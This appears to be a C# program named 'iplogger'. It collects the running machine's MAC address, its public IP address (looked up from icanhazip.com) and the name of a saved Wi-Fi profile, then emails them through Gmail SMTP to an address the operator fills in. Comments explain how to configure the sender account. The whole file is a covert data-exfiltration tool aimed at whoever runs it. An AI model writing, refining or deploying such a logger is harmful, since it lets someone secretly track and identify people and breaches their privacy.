using System;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Net.Mail;
using NativeWifi;
using System.Text;

namespace iplogger
{
    class Ip
    {
        public static void Main(string[] args)
        {
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                string name = null;
                static string GetStringForSSID(Wlan.Dot11Ssid ssid)
                {
                    return Encoding.ASCII.GetString(ssid.SSID, 0, (int)ssid.SSIDLength);
                }
                WlanClient client = new WlanClient();
                foreach (WlanClient.WlanInterface wlanIface in client.Interfaces)
                {
                    foreach (Wlan.WlanProfileInfo profileInfo in wlanIface.GetProfiles())
                    {
                        name = profileInfo.profileName; // this is typically the network's SSID
                        break;
                    }
                    Console.WriteLine(name);
                    var mac = string.Join(":", nic.GetPhysicalAddress().GetAddressBytes().Select(b => b.ToString("X2"))); //gets mac address and writes it into a variable
                    string publicip = new WebClient().DownloadString("http://icanhazip.com"); //gets the public ip and writes it into a string
                    Console.WriteLine(mac);
                    Console.WriteLine(publicip);
                    var fromAddress = new MailAddress("from@gmail.com", $"From Logger: {publicip}"); //change from@gmail.com to the sender email (create an email and set lesssecureapps on)
                    var toAddress = new MailAddress("to@gmail.com", "To Echo"); //change to@gmail.com to the reciever email (set lesssecureapps on)
                    var fromPassword = "senderpassword"; //change senderpassword to the password of the sender
                    var smtp = new SmtpClient
                    {
                        Host = "smtp.gmail.com",
                        Port = 587,
                        EnableSsl = true,
                        DeliveryMethod = SmtpDeliveryMethod.Network,
                        UseDefaultCredentials = false,
                        Credentials = new NetworkCredential(fromAddress.Address, fromPassword)
                    };
                    using (var message = new MailMessage(fromAddress, toAddress)
                    {
                        Subject = "logs from the logger"
                        ,
                        Body = $"Mac Address: {mac} Ip Address: {publicip} Random profile wifi ssid: {name}"
                    })
                    {
                        smtp.Send(message);
                    }
                    break;
                }
                break;
            }
        }
    }
}
